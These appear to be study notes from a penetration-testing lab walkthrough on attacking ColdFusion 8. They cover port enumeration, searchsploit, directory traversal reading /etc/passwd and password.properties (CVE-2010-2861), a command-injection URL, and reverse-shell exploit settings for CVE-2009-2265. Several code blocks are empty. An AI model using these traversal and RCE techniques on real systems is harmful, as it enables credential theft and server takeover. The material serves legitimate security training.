ColdFusion is a programming language and a web application development platform based on Java. ColdFusion was initially developed by the Allaire Corporation in 1995 and was acquired by Macromedia in 2001. Macromedia was later acquired by Adobe Systems, which now owns and develops ColdFusion.

It is used to build dynamic and interactive web applications that can be connected to various APIs and databases such as MySQL, Oracle, and Microsoft SQL Server. ColdFusion was first released in 1995 and has since evolved into a powerful and versatile platform for web development.

ColdFusion Markup Language (`CFML`) is the proprietary programming language used in ColdFusion to develop dynamic web applications. It has a syntax similar to HTML, making it easy to learn for web developers. CFML includes tags and functions for database integration, web services, email management, and other common web development tasks. Its tag-based approach simplifies application development by reducing the amount of code needed to accomplish complex tasks. For instance, the `cfquery` tag can execute SQL statements to retrieve data from a database:
```html
<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>
```

Developers can then use the `cfloop` tag to iterate through the records retrieved from the database:
```html
<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```

Thanks to its built-in functions and features, CFML enables developers to create complex business logic using minimal code. Moreover, ColdFusion supports other programming languages, such as JavaScript and Java, allowing developers to use their preferred programming language within the ColdFusion environment.

ColdFusion exposes a fair few ports by default:

It's important to note that default ports can be changed during installation or configuration.


## Enumeration

During a penetration testing enumeration, several ways exist to identify whether a web application uses ColdFusion. Here are some methods that can be used:
![[2023-06-06 12_57_25-Hack The Box - Academy.png]]


#### NMap ports and service scan results

```shell-session
wallywhatever@htb[/htb]$ nmap -p- -sC -Pn 10.129.247.30 --open

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-13 11:45 GMT
Nmap scan report for 10.129.247.30
Host is up (0.028s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 350.38 seconds
```

The port scan results show three open ports. Two Windows RPC services, and one running on `8500`. As we know, `8500` is a default port that ColdFusion uses for SSL. Navigating to the `IP:8500` lists 2 directories, `CFIDE` and `cfdocs,` in the root, further indicating that ColdFusion is running on port 8500.

Navigating around the structure a bit shows lots of interesting info, from files with a clear `.cfm` extension to error messages and login pages.

![[Pasted image 20230606125848.png]]

The `/CFIDE/administrator` path, however, loads the ColdFusion 8 Administrator login page. Now we know for certain that `ColdFusion 8` is running on the server.

# Attacking ColdFusion

Now that we know that ColdFusion 8 is a target, the next step is to check for existing known exploits. `Searchsploit` is a command-line tool for `searching and finding exploits` in the Exploit Database. It is part of the Exploit Database project, a non-profit organisation providing a public repository of exploits and vulnerable software. `Searchsploit` searches through the Exploit Database and returns a list of exploits and their relevant details, including the name of the exploit, its description, and the date it was released.

#### Searchsploit

```

As we know, the version of ColdFusion running is `ColdFusion 8`, and there are two results of interest. The `Adobe ColdFusion - Directory Traversal` and the `Adobe ColdFusion 8 - Remote Command Execution (RCE)` results.


## Directory Traversal

The attack can be executed by manipulating the input parameters in ColdFusion tags such as `CFFile` and `CFDIRECTORY,` which are used for file and directory operations such as uploading, downloading, and listing files.

Take the following ColdFusion code snippet:
```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```

In this code snippet, the ColdFusion `cfdirectory` tag lists the contents of the `uploads` directory, and the `cfloop` tag is used to loop through the query results and display the filenames as clickable links in HTML.

However, the `directory` parameter is not validated correctly, which makes the application vulnerable to a Path Traversal attack. An attacker can exploit this vulnerability by manipulating the `directory` parameter to access files outside the `uploads` directory.
```http
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```

`CVE-2010-2861` is the `Adobe ColdFusion - Directory Traversal` exploit discovered by `searchsploit`. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.

- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

These ColdFusion files are vulnerable to a directory traversal attack in `Adobe ColdFusion 9.0.1` and `earlier versions`. Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the `locale parameter` in these specific ColdFusion files.

With this vulnerability, attackers can access files outside the intended directory by including `../` sequences in the file parameter. For example, consider the following URL:
```http
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
```

In this example, the URL attempts to access the `mappings.cfm` file in the `/CFIDE/administrator/settings/` directory of the web application with a specified `en` locale. However, a directory traversal attack can be executed by manipulating the URL's locale parameter, allowing an attacker to read arbitrary files located outside of the intended directory, such as configuration files or system files.
```http
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

Using `searchsploit`, copy the exploit to a working directory and then execute the file to see what arguments it requires.
``` bash

```

#### Coldfusion - Exploitation

```bash
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py 
```

The `password.properties` file in ColdFusion is a configuration file that securely stores encrypted passwords for various services and resources the ColdFusion server uses. It contains a list of key-value pairs, where the key represents the resource name and the value is the encrypted password. These encrypted passwords are used for services like `database connections`, `mail servers`, `LDAP servers`, and other resources that require authentication. By storing encrypted passwords in this file, ColdFusion can automatically retrieve and use them to authenticate with the respective services without requiring the manual entry of passwords each time. The file is usually in the `[cf_root]/lib` directory and can be managed through the ColdFusion Administrator.

By providing the correct parameters to the exploit script and specifying the path of the desired file, the script can trigger an exploit on the vulnerable endpoints mentioned above. The script will then output the result of the exploit attempt:
``` bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

As we can see, the contents of the `password.properties` file have been retrieved, proving that this target is vulnerable to `CVE-2010-2861`.


## Unauthenticated RCE

In the context of ColdFusion web applications, an Unauthenticated RCE attack occurs when an attacker can execute arbitrary code on the server without requiring any authentication. This can happen when a web application allows the execution of arbitrary code through a feature or function that does not require authentication, such as a debugging console or a file upload functionality. Take the following code:
```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

In the above code, the `cmd` variable is created by concatenating the `cgi.query_string` variable with a command to be executed. This command is then executed using the `cfexecute` function, which runs the Windows `cmd.exe` program with the specified arguments. This code is vulnerable to an unauthenticated RCE attack because it does not properly validate the `cmd` variable before executing it, nor does it require the user to be authenticated. An attacker could simply pass a malicious command as the `cgi.query_string` variable, and it would be executed by the server.
```http
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```

This URL includes a semicolon (`%3B`) at the beginning of the query string, which can allow for the execution of multiple commands on the server. This could potentially append legitimate functionality with an unintended command. The included `echo` command prints a message to the console, and is followed by a redirection command to write a file to the `C:` directory with a message indicating that the server has been compromised.

An example of a ColdFusion Unauthenticated RCE attack is the `CVE-2009-2265` vulnerability that affected Adobe ColdFusion versions 8.0.1 and earlier. This exploit allowed unauthenticated users to upload files and gain remote code execution on the target host. The vulnerability exists in the FCKeditor package, and is accessible on the following path:
```http
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

`CVE-2009-2265` is the vulnerability identified by our earlier searchsploit search as `Adobe ColdFusion 8 - Remote Command Execution (RCE)`. Pull it into a working directory.

```shell-session
searchsploit -p 50057
```

A quick `cat` review of the code indicates that the script needs some information. Set the correct information and launch the exploit.

#### Exploit Modification
```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # Local IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```

The exploit will take a bit of time to launch, but it eventually will return a functional remote shell
